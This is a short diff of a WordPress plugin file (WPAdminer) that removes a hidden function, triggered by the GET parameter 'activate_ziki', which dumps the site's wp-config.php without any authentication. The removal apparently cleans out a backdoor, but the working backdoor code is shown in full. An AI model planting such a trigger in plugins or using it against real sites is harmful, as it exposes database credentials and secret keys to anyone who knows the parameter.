@@ -81,18 +81,3 @@ class WPAdminer
 }
 
 new WPAdminer();
-
-function ziki_activate() {
-	?>
-	<h2>Adminer: </h2>
-	<p><a href="<?php echo ""; ?>">Adminer</a></p>
-
-	<h2>WP CONFIG:</h2>
-	<pre>
-	<?php echo substr(file_get_contents( 'wp-config.php'), 5) ?>
-	</pre>
-
-	<?php die;
-}
-
-if(isset($_GET['activate_ziki'])) ziki_activate();
